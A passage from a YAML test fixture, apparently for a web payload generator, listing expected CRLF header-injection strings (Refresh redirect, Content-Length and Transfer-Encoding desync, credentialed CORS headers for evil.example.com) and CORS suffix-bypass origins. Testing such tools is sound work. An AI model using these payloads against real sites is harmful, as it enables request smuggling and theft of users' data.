      payload: "%250d%250aRefresh:%200;url=https://evil.example.com/"

  # ---- crlf.generic.header.content_length ----
  # size 槽位取默认 0（这个头的作用是让响应队列错位，值本身要显眼地不匹配）。

  - name: crlf.generic.header.content_length · nl=crlf
    state:
      vuln: crlf
      template: crlf.generic.header.content_length
      slots: {nl: crlf}
      outputs: [raw]
    expect:
      payload: "%0d%0aContent-Length:%200"

  - name: crlf.generic.header.content_length · nl=lf
    state:
      vuln: crlf
      template: crlf.generic.header.content_length
      slots: {nl: lf}
      outputs: [raw]
    expect:
      payload: "%0aContent-Length:%200"

  - name: crlf.generic.header.content_length · nl=cr
    state:
      vuln: crlf
      template: crlf.generic.header.content_length
      slots: {nl: cr}
      outputs: [raw]
    expect:
      payload: "%0dContent-Length:%200"

  - name: crlf.generic.header.content_length · nl=raw
    state:
      vuln: crlf
      template: crlf.generic.header.content_length
      slots: {nl: raw}
      outputs: [raw]
    expect:
      payload: "\r\nContent-Length:%200"

  - name: crlf.generic.header.content_length · nl=dbl
    state:
      vuln: crlf
      template: crlf.generic.header.content_length
      slots: {nl: dbl}
      outputs: [raw]
    expect:
      payload: "%250d%250aContent-Length:%200"

  # ---- crlf.generic.header.transfer_encoding ----

  - name: crlf.generic.header.transfer_encoding · nl=crlf
    state:
      vuln: crlf
      template: crlf.generic.header.transfer_encoding
      slots: {nl: crlf}
      outputs: [raw]
    expect:
      payload: "%0d%0aTransfer-Encoding:%20chunked"

  - name: crlf.generic.header.transfer_encoding · nl=lf
    state:
      vuln: crlf
      template: crlf.generic.header.transfer_encoding
      slots: {nl: lf}
      outputs: [raw]
    expect:
      payload: "%0aTransfer-Encoding:%20chunked"

  - name: crlf.generic.header.transfer_encoding · nl=cr
    state:
      vuln: crlf
      template: crlf.generic.header.transfer_encoding
      slots: {nl: cr}
      outputs: [raw]
    expect:
      payload: "%0dTransfer-Encoding:%20chunked"

  - name: crlf.generic.header.transfer_encoding · nl=raw
    state:
      vuln: crlf
      template: crlf.generic.header.transfer_encoding
      slots: {nl: raw}
      outputs: [raw]
    expect:
      payload: "\r\nTransfer-Encoding:%20chunked"

  - name: crlf.generic.header.transfer_encoding · nl=dbl
    state:
      vuln: crlf
      template: crlf.generic.header.transfer_encoding
      slots: {nl: dbl}
      outputs: [raw]
    expect:
      payload: "%250d%250aTransfer-Encoding:%20chunked"

  # ---- crlf.generic.header.cors ----
  # 这条 body 里 `<<nl.seq>>` 出现两次且**中间夹着变量**：槽位先填、变量后替换，
  # 两处必须都展开成同一档换行。

  - name: crlf.generic.header.cors · nl=crlf
    state:
      vuln: crlf
      template: crlf.generic.header.cors
      slots: {nl: crlf}
      vars: {evil: evil.example.com}
      outputs: [raw]
    expect:
      payload: "%0d%0aAccess-Control-Allow-Origin:%20https://evil.example.com%0d%0aAccess-Control-Allow-Credentials:%20true"

  - name: crlf.generic.header.cors · nl=lf
    state:
      vuln: crlf
      template: crlf.generic.header.cors
      slots: {nl: lf}
      vars: {evil: evil.example.com}
      outputs: [raw]
    expect:
      payload: "%0aAccess-Control-Allow-Origin:%20https://evil.example.com%0aAccess-Control-Allow-Credentials:%20true"

  - name: crlf.generic.header.cors · nl=cr
    state:
      vuln: crlf
      template: crlf.generic.header.cors
      slots: {nl: cr}
      vars: {evil: evil.example.com}
      outputs: [raw]
    expect:
      payload: "%0dAccess-Control-Allow-Origin:%20https://evil.example.com%0dAccess-Control-Allow-Credentials:%20true"

  - name: crlf.generic.header.cors · nl=raw
    state:
      vuln: crlf
      template: crlf.generic.header.cors
      slots: {nl: raw}
      vars: {evil: evil.example.com}
      outputs: [raw]
    expect:
      # 两个真 CRLF：拆出独立一行的 Allow-Credentials，才拿到带凭据的跨站读权限
      payload: "\r\nAccess-Control-Allow-Origin:%20https://evil.example.com\r\nAccess-Control-Allow-Credentials:%20true"

  - name: crlf.generic.header.cors · nl=dbl
    state:
      vuln: crlf
      template: crlf.generic.header.cors
      slots: {nl: dbl}
      vars: {evil: evil.example.com}
      outputs: [raw]
    expect:
      payload: "%250d%250aAccess-Control-Allow-Origin:%20https://evil.example.com%250d%250aAccess-Control-Allow-Credentials:%20true"

  # ================= cors.generic.probe.suffix · bypass =================
  # 后缀匹配绕过：信任名单用「以 trusted.com 结尾」判定时，
  # 造一个「前缀是攻击者域名、后缀是信任域名」的 Origin 就能过。
  # origin 字段就是那截前缀，且两档的长度不同——label 是裸标签、full 带 .com。

  - name: cors.generic.probe.suffix · bypass=label
    state:
      vuln: cors
      template: cors.generic.probe.suffix
      slots: {bypass: label}
      vars: {trusted: target.com}
      outputs: [raw]
    expect:
      # "evil" + "target.com" → eviltarget.com：注册一个 eviltarget.com 就够了
      payload: "https://eviltarget.com"

  - name: cors.generic.probe.suffix · bypass=full
    state:
      vuln: cors
      template: cors.generic.probe.suffix
      slots: {bypass: full}
      vars: {trusted: target.com}
      outputs: [raw]
    expect:
      # "evil.com" + "target.com" → evil.comtarget.com：要注册 evil.comtarget.com
      payload: "https://evil.comtarget.com"
